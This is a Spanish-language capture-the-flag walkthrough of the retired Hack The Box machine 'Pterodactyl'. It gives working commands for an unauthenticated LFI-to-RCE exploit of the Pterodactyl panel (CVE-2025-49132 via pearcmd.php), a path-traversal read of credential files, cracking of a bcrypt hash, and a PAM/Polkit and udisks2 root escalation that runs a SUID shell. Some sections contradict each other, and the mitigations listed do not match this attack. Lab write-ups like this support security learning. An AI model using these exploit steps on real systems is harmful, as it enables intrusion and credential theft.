---
machine: Pterodactyl
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, opensuse, pterodactyl, cve-2025-49132, pearcmd, polkit, udisks2]
---

# Pterodactyl — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

**openSUSE Leap 15.6** con el panel **Pterodactyl 1.11.10** en `panel.pterodactyl.htb`. La CVE-2025-49132 permite **LFI/RCE sin autenticar** en `/locales/locale.json`; encadenada con `pearcmd.php` escribe un webshell y ejecuta como `wwwrun`, y de paso filtra las credenciales de la base de datos. Con `php artisan tinker` se vuelca la tabla de usuarios (el modelo oculta `password`, hay que pedirlo explícito), se crackea el hash bcrypt de `phileasfogg3` y se entra por SSH. Root con la cadena **CVE-2025-6018 + CVE-2025-6019**: PAM/Polkit y `udisks2` sin `nosuid`.

## Reconocimiento

```bash
nmap -p- --min-rate 3500 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 9.6p1 (openSUSE Leap 15.6)
80/tcp  http  nginx 1.21.5
```

```bash
curl -s http://<IP>/changelog.txt
```

```text
[Installed] Pterodactyl Panel v1.11.10
```

También hay un `phpinfo.php` expuesto. Enumeración de vhosts:

```bash
ffuf -u http://<IP>/ -H "Host: FUZZ.pterodactyl.htb" -w <wordlist> -fs <tamaño_base>
```

```text
pterodactyl.htb        -> landing de Minecraft
panel.pterodactyl.htb  -> panel Pterodactyl v1.11.10
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

`/locales/locale.json` usa los parámetros `locale` y `namespace` para construir una ruta que acaba en `require()`, sin normalizar. Se usa un PoC público ajustando la ruta de PEAR de openSUSE (suele necesitar más `../` que en Debian):

```bash
python3 poc.py panel.pterodactyl.htb "echo <base64> | base64 -d | bash"
```

El mismo fallo lee ficheros del panel:

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../../var/www/pterodactyl&namespace=.env"
```

Del `.env` y de `config/database.php` salen `APP_KEY`, usuario y contraseña de MariaDB. La cadena con **PEAR** es la que da ejecución: `pearcmd.php` acepta argumentos por query string (`register_argc_argv`) y escribe un fichero PHP en el webroot, que después se incluye. La shell vuelve como **`wwwrun`**.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

La primera pieza es específica de SUSE: `pam_env` procesa `~/.pam_environment` **antes** de `pam_systemd`, así que se pueden inyectar `XDG_SEAT` y `XDG_VTNR` y hacer que Polkit trate la sesión SSH como una consola local (`allow_active`).

```bash
cat > ~/.pam_environment <<'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```

Con esos permisos `allow_active` se usa la segunda pieza: **CVE-2025-6019** es una carrera en el *resize* de una imagen XFS — `libblockdev`/`udisks2` acaba montando el sistema de ficheros sin `nosuid`, así que el binario SUID de root de la imagen se ejecuta con privilegios:

```bash
# imagen XFS con /root-shell SUID ya preparada
udisksctl loop-setup -f rootfs.img
udisksctl mount -b /dev/loop0
/run/media/<usuario>/<uuid>/root-shell -p
```

```text
uid=0(root)
```

Con root se leen `/root/root.txt` y la flag de usuario ya obtenida.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un panel de terceros sin actualizar con CVE crítica sin autenticar es el punto de entrada, y el `changelog.txt` dice la versión exacta.
- El LFI no solo lee: con `pearcmd.php` y `register_argc_argv` escribe y ejecuta.
- Las credenciales de la base de datos del panel son la vía al hash bcrypt, y la reutilización de contraseña hace el resto.
- En SUSE, PAM y Polkit no se comportan como en Debian: `pam_env` antes de `pam_systemd` convierte una sesión remota en local.
- Detección: peticiones a `/locales/locale.json` con `../`, escrituras en el webroot y montajes de loop devices desde una cuenta web.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.


## Movimiento lateral: de wwwrun a usuario

```bash
cd /var/www/pterodactyl
php artisan tinker
# User::select('email','username','password')->get();
```

El modelo `User` esconde `password` en `$hidden`, así que un `select *` normal no lo devuelve; pidiendo la columna de forma explícita sí. Alternativa: entrar en MariaDB con las credenciales del `.env` (`mysql -h 127.0.0.1 -u pterodactyl -p'<password>' panel`).

El hash bcrypt de `phileasfogg3` cae con John:

```bash
john --wordlist=rockyou.txt hash.txt
```

La contraseña está reutilizada en SSH:

```bash
ssh phileasfogg3@<IP>
cat ~/user.txt
```

En `/var/mail/` hay un correo que menciona la cadena de escalada de udisks, la pista del siguiente paso.

## Referencias

- [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132)
- [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018)
- [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019)
- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
- [systemd-timers](../../../knowledge/privesc/systemd-timers.md)
